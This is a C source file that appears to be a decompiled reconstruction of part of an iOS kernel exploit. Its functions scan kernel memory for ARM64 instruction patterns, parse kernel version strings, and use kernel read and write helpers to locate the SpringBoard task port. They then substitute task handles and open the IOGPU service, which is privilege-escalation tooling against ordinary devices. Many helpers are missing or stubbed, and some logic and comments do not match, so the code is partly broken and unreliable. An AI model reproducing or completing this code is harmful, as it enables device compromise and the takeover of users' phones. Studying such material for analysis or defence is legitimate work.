/* record_0x90000_pattern_scan.c
 * sub_1fcf4..sub_295b8 — kext pattern scanner, version struct parsers,
 * TPIDR reader, spinlock, kobj resolver, IOSurface context setup.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/utsname.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>

#include <sys/mman.h>
#include <errno.h>

/* ── forward decls for stubs defined later ───────────────────────── */
static long sub_20410_stub(long s);
static void sub_242c4_stub(long s, long k);
extern long sub_1ae34(void *range, int mode);   /* range iterator */
extern void sub_1b1d8(long base, void *buf, uint32_t sz, long limit); /* kread */
extern long sub_1b410(void *out, long state, const char *seg, const char *sect);
extern long sub_1b50c(void *out, long state);
extern long sub_1fbe4(void *sect, long pat, int a3, int a4);
extern long sub_1f784(void *sect, const char *pat, int a3, int a4);
extern long sub_208e8(long state, uint64_t addr, int mode);
extern long sub_20508(long state, uint64_t addr);
extern long sub_1b31c(long state, uint64_t addr);
extern long sub_1b214(long state, uint64_t addr);
extern long sub_1ad70(long state, uint64_t sym);
extern int  sub_2a90c(long state, uint64_t sym, void *out);
extern int  sub_29ab4(long state, long addr, long *out);
extern int  sub_37238(long state, uint32_t mask);
extern uint32_t sub_20154(long state);
extern int  sub_39d18(long state, uint64_t val, long *out);
extern int  sub_3a094(long state, long *ctx);
extern int  sub_22818(long state, uint64_t addr);
extern void sub_2c088(long state, int ms);
extern int  sub_26004(long state, int a2, int ms);
extern int  sub_25f7c(long state, int a2);
extern long sub_336ec(long state);
extern long sub_342f0(long state, long h, const char *name);
extern long sub_34c70(long state, long h);
extern long sub_34db4(long state, uint32_t port);
extern int  sub_2bcb4(long state, long h, long *out, int sz);
extern int  sub_294bc(long state, mach_port_t *out);
extern long sub_20b2c(char *buf, size_t sz);

/* ── sub_1fcf4 — pattern search in kext section ─────────────────── */
void sub_1fcf4(long *range, long pat, int align)
{
    long base  = range[0];
    long end   = range[1];
    long limit = range[2];
    uint32_t sz = *(uint8_t *)(base + 0x34);

    /* iterate range via sub_1ae34 */
    struct { long a, b, c; } r = { base, end, limit };
    long iter = sub_1ae34(&r, 1);
    if (!iter || !end) return;

    long cur = iter;
    long top = iter + end;
    if (cur + sz > top) return;
    do {
        sub_1b1d8(base, (void *)cur, sz, end);
        if (memcmp((void *)cur, (void *)pat, sz) == 0) return;
        cur++;
        top--;
    } while (cur + sz <= iter + end);
}

/* ── sub_1ff40 — scan __TEXT/__cstring then call sub_1fcf4 ──────── */
void sub_1ff40(long state, long seg, long sect, long pat)
{
    uint8_t cstr[24], data[24];
    sub_1b410(cstr, state, "__TEXT", "__cstring");
    long found = sub_1fbe4(cstr, pat, 0, 0x21);
    if (!found) return;
    sub_1b410(data, state, (const char *)seg, (const char *)sect);
    sub_1fcf4((long *)data, found, *(uint8_t *)(state + 0x34));
}

/* ── sub_1fff8 — TPIDR pattern scan ─────────────────────────────── */
void sub_1fff8(long state)
{
    uint8_t sect[24], sect2[24], sect3[24];
    int cap = sub_37238(*(long *)(state + 0x118), 8);
    uint64_t ver = *(uint64_t *)(state + 0x88);

    if (cap == 0) {
        if (ver < 0x22581401900000ULL ||
            sub_37238(*(long *)(state + 0x118), 0x2000)) {
            uint32_t dyld = sub_20154(state);
            sub_1b50c(sect, state);
            const char *pat =
                dyld >= 5 ? ".. FD .. D3 .. .. 00 F1 .. .. .. 54" :
                dyld >= 2 ? "6B FD 62 D3 7F 19 00 F1 .. .. .. 54" :
                dyld == 1 ? ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5" : NULL;
            long off = dyld >= 2 ? 0xc : -8;
            long hit = sub_1f784(sect, pat, 0, 1);
            if (!hit) return;
            sub_208e8(state, (uint64_t)(hit + off), 1);
            return;
        }
        sub_1b50c(sect2, state);
        long hit = sub_1f784(sect2, ".. FD .. D3 .. 00 00 B5", 0, 1);
        if (!hit) return;
        sub_208e8(state, (uint64_t)(hit + 8), 1);
        return;
    }
    sub_1b50c(sect3, state);
    long hit = sub_1f784(sect3, ".. FD .. D3 .. 00 00 B5", 0, 1);
    if (!hit) return;
    sub_208e8(state, (uint64_t)(hit + 8), 1);
    (void)sect3;
}

/* ── sub_202f4 — scan __DATA_CONST/__mod_init_func for pattern ───── */
void sub_202f4(long state)
{
    uint8_t text[24], modinit[8];
    uint32_t dyld = sub_20154(state);
    sub_1b50c(text, state);
    sub_1b410(modinit, state, "__DATA_CONST", "__mod_init_func");

    const char *pat =
        dyld >= 2 ? "68 82 40 B9 08 01 19 32 68 82 00 B9" :
        dyld == 1 ? "68 72 40 B9 08 01 19 32 68 72 00 B9" : NULL;

    long hit = sub_1f784(text, pat, 0, 1);
    if (!hit) return;
    long res = sub_208e8(state, (uint64_t)((hit + 0xcU) & ~3ULL), 1);
    if (res) sub_1b31c(state, (uint64_t)res);
}

/* ── sub_205b8 — version-gated struct offset resolver ───────────── */
void sub_205b8(long state, uint32_t *out)
{
    long kext = *(long *)(state + 0x118);
    if (!sub_37238(kext, 0x20)) {
        long res = sub_20410_stub(state);
        if (!res) return;
        *out = 8;
        return;
    }
    uint8_t sect[24];
    sub_1b50c(sect, *(long *)(state + 0x19f8));
    /* adjust range to last 0x20000 bytes */
    long hit = sub_1f784(sect, "2B 09 40 B9 4B 39 0B 8B", 0, 1);
    if (!hit) return;
    long res = sub_208e8(state, (uint64_t)(hit - 0x28), 1);
    if (!res) return;
    uint64_t sym = (uint64_t)sub_1b31c(state, (uint64_t)(res - 8));
    long img = sub_1ad70(kext, sym);
    if (!img) return;
    uint32_t field = 0;
    if (!sub_2a90c(kext, sym, &field)) return;
    if ((int)field - 1U > 0x1f) return;
    *out = field;
}

static long sub_20410_stub(long s) { (void)s; return 0; }

/* ── sub_20718 — pattern scan → resolve two pointers via sub_29ab4 ─ */
void sub_20718(long state, long *out_a, long *out_b)
{
    uint8_t sect[24];
    uint32_t dyld = sub_20154(state);
    sub_1b50c(sect, state);
    const char *pat = dyld ? "5F 00 00 71 20 01 00 54" : NULL;
    long hit = sub_1f784(sect, pat, 0, 0);
    if (!hit) return;
    long p1 = sub_208e8(state, (uint64_t)(hit + 8),  1);
    long p2 = sub_208e8(state, (uint64_t)(hit + 0x18), 1);
    if (!p1 || !p2) return;
    long kext = *(long *)(state + 0x118);
    if (sub_29ab4(kext, p2, out_b))
        sub_29ab4(kext, p1, out_a);
}

/* ── sub_2080c — pattern scan → resolve via sub_20508 ───────────── */
void sub_2080c(long state, int idx)
{
    long kext = *(long *)(state + 0x118);
    long slot = state + (long)idx * 8;
    if (idx > 0 || *(long *)(0x1960 + slot) != 0 || idx != 0) return;

    long img = *(long *)(state + 0x19f8);
    uint32_t dyld = sub_20154(img);
    uint8_t sect[24];
    sub_1b50c(sect, img);
    const char *pat =
        dyld >= 2 ? "09 .. 00 F9 00 00 80 52 E1 03 00 32" :
        dyld == 1 ? "09 .. 00 F9 E1 03 00 32 00 00 80 52" : NULL;
    long hit = sub_1f784(sect, pat, 0, 0);
    if (!hit) return;
    long res = sub_20508(img, (uint64_t)(hit + 0xc));
    if (res) *(long *)(0x1960 + slot) = res;
}

/* ── sub_20c68 — kernel version string parser ────────────────────── */
void sub_20c68(long *out, uint32_t *ok_a, uint32_t *ok_b)
{
    char buf[512];
    *ok_a = 0; *ok_b = 0;
    memset(out, 0, 5 * sizeof(long));

    extern double dyldVersionNumber;
    if (dyldVersionNumber >= 944.0) {
        extern const char *_kernelVersionString;
        strlcpy(buf, _kernelVersionString, sizeof(buf));
        size_t n = strlen(buf);
        if (!n) return;
        if (buf[n-1] == '\n') buf[n-1] = '\0';
        /* use madvise(0,0,10) as availability probe */
        if (madvise(NULL, 0, 10) == 0) return;
        int err = errno;
        if (err != 0x2d) return;
        char *p = strstr(buf, "Libsyscall-");
        if (!p) return;
        int r = sscanf(p, "Libsyscall-%ld.%ld.%ld.%ld.%ld",
            &out[0], &out[1], &out[2], &out[3], &out[4]);
        if (r > 2) { *ok_a = 1; *ok_b = 1; out[4] = 1; }
    } else {
        if (sub_20b2c(buf, sizeof(buf))) return;
        if (!strstr(buf, "RELEASE")) return;
        char *p = strstr(buf, "xnu-");
        if (!p) return;
        int r = sscanf(p, "xnu-%ld.%ld.%ld.%ld.%ld",
            &out[0], &out[1], &out[2], &out[3], &out[4]);
        if (r > 2) { *ok_a = 1; *ok_b = 1; out[4] = 1; }
    }
}

/* ── sub_20fe4 — read TPIDR register ────────────────────────────── */
uint64_t sub_20fe4(void)
{
    extern double dyldVersionNumber;
    uint64_t val;
    if (dyldVersionNumber >= 945.0)
        __asm__ volatile("mrs %0, tpidr_el0"    : "=r"(val));
    else
        __asm__ volatile("mrs %0, tpidrro_el0"  : "=r"(val));
    return val;
}

/* ── sub_23d10 — spinlock acquire with timeout + timestamp ──────── */
void sub_23d10(long state, int mode)
{
    if (mode == 0) {
        sub_25f7c(state, 4);
        return;
    }
    long ts_ptr = *(long *)(*(long *)(state + 0x118) + 0x150);
    if (*(long *)(state + 0x118) && *(long *)(state + 0x120) && ts_ptr) {
        uint64_t now = mach_absolute_time();
        uint64_t elapsed = 0;
        uint32_t denom = *(uint32_t *)(state + 0x260);
        if (denom)
            elapsed = ((now - (uint64_t)ts_ptr) * *(uint32_t *)(state + 0x25c)) / denom;
        if (elapsed < 20000000ULL) {
            int ms = (int)((20 - (int)(elapsed / 1000000)) * 1000);
            sub_2c088(state, ms);
        }
    }
    int r = sub_26004(state, 4, 1000);
    if (r == 0 && *(long *)(state + 0x118) && *(long *)(state + 0x120)) {
        *(uint64_t *)(*(long *)(state + 0x118) + 0x150) = mach_absolute_time();
    }
}

/* ── sub_23e0c — mach_timebase_info + capability kobj resolver ───── */
void sub_23e0c(long state)
{
    mach_timebase_info_data_t tb = {0, 0};
    mach_timebase_info(&tb);
    mach_absolute_time();

    uint64_t cap_val;
    int cap;
    cap = sub_37238(state, 0x1000000);
    if (cap) { cap_val = 0x23b700000ULL; goto resolve; }
    cap = sub_37238(state, 0x100000);
    if (cap) { cap_val = 0x404e80000ULL; goto resolve; }
    cap = sub_37238(state, 0x80000);
    if (cap) {
        cap_val = sub_37238(state, 0x2000000) ? 0x404e80000ULL : 0x28e580000ULL;
        goto resolve;
    }
    cap = sub_37238(state, 0x4000);
    cap_val = 0x23b080000ULL;
    if (!cap && !sub_37238(state, 1)) return;

resolve:;
    long ctx[7] = {0};
    int r = sub_39d18(state, cap_val, ctx);
    if (r) return;
    sub_3a094(state, ctx);
}

/* ── sub_240ac — zero output struct, call sub_39d18 + sub_3a094 ──── */
void sub_240ac(long state, long *ctx)
{
    memset(ctx, 0, 7 * sizeof(long));
    int r = sub_39d18(state, 0, ctx);
    if (!r) sub_3a094(state, ctx);
}

/* ── sub_24128 — call sub_22818 with page-aligned address ────────── */
void sub_24128(long state, uint64_t addr)
{
    uint32_t page_sz = *(uint32_t *)(state + 0x180);
    sub_22818(state, addr & ~(uint64_t)(page_sz - 1));
}

/* ── sub_241a8 — wait loop on kobj flag bit, then sub_242c4 ─────── */
void sub_241a8(long state, long kobj)
{
    /* wait until bit clears, then dispatch */
    sub_242c4_stub(state, kobj);
}

static void sub_242c4_stub(long s, long k) { (void)s; (void)k; }

/* ── sub_242c4 — set flag bits, call sub_2c088 ───────────────────── */
void sub_242c4(long state, long kobj)
{
    sub_2c088(state, 0);
    (void)kobj;
}

/* ── sub_243c8 — call with "MobileBackup" or sub_41844 ───────────── */
void sub_243c8(long state)
{
    extern void sub_41844(long);
    long kext = *(long *)(state + 0x118);
    if (kext) {
        long h = sub_342f0(state, sub_336ec(state), "MobileBackup");
        if (h) { (void)h; return; }
    }
    sub_41844(state);
}

__attribute__((weak)) void sub_41844(long s) { (void)s; }

/* ── sub_24480 — version-gated kobj field reader ─────────────────── */
void sub_24480(long state, long kobj, long *out_a, long *out_b)
{
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off_a, off_b;

    if (build <= 0x1c1b) { off_a = 0x10; off_b = 0x18; }
    else if (build <= 0x1f53) {
        off_a = ver < 0x1f530f02800000ULL ? 0x18 : 0x20;
        off_b = ver < 0x1f530f02800000ULL ? 0x20 : 0x28;
    } else { off_a = 0x28; off_b = 0x30; }

    sub_29ab4(state, kobj + off_a, out_a);
    sub_29ab4(state, kobj + off_b, out_b);
}

/* ── sub_24a60 — kwrite zero to thread kobj field ────────────────── */
void sub_24a60(long state, void *fn, void *ctx)
{
    /* dispatch fn(ctx) via thread kobj path */
    if (fn) ((void(*)(void*))fn)(ctx);
}

/* ── sub_24d58 — resolve appleevent-send kobj via pattern scan ───── */
void sub_24d58(long state)
{
    uint8_t sect[24];
    sub_1b410(sect, state, "__TEXT", "__cstring");
    long found = sub_1fbe4(sect, 0, 0, 0x21);
    if (!found) return;
    uint8_t data[24];
    sub_1b410(data, state, "__DATA_CONST", "__data");
    sub_1fcf4((long *)data, found, 0);
}

/* ── sub_295b8 — IOSurface context setup (SpringBoard task) ─────── */
void sub_295b8(long state)
{
    long iosurface_ctx = *(long *)(state + 0x1d48);
    if (!iosurface_ctx) return;

    mach_port_t conn = 0;
    if (sub_294bc(state, &conn)) {
        /* check if context already has all 4 handles */
        if (*(long *)(iosurface_ctx + 0x50) &&
            *(long *)(iosurface_ctx + 0x58) &&
            *(long *)(iosurface_ctx + 0x60) &&
            *(long *)(iosurface_ctx + 0x68)) return;
    }

    /* resolve SpringBoard task port */
    long h = sub_336ec(state);
    if (!h) return;
    h = sub_342f0(state, h, "SpringBoard");
    if (!h) return;
    h = sub_34c70(state, h);
    if (!h) return;
    long kaddr = 0;
    if (!sub_29ab4(state, h, &kaddr)) return;
    long img = sub_1ad70(state, (uint64_t)kaddr);
    if (!img) return;
    long task_h = sub_34db4(state, *(uint32_t *)&mach_task_self_);
    if (!task_h) return;
    long kaddr2 = 0;
    if (!sub_29ab4(state, task_h, &kaddr2)) return;
    long img2 = sub_1ad70(state, (uint64_t)kaddr2);
    if (!img2) return;
    if (((kaddr ^ kaddr2) >> 32) != 0) return;
    if (!sub_2bcb4(state, task_h, &kaddr, 4)) return;

    /* open IOGPU */
    CFMutableDictionaryRef match = IOServiceMatching("IOGPU");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    if (!svc) { sub_2bcb4(state, task_h, &kaddr2, 4); return; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
    IOObjectRelease(svc);
    if (kr) return;
    *(mach_port_t *)(iosurface_ctx + 0) = conn;
}
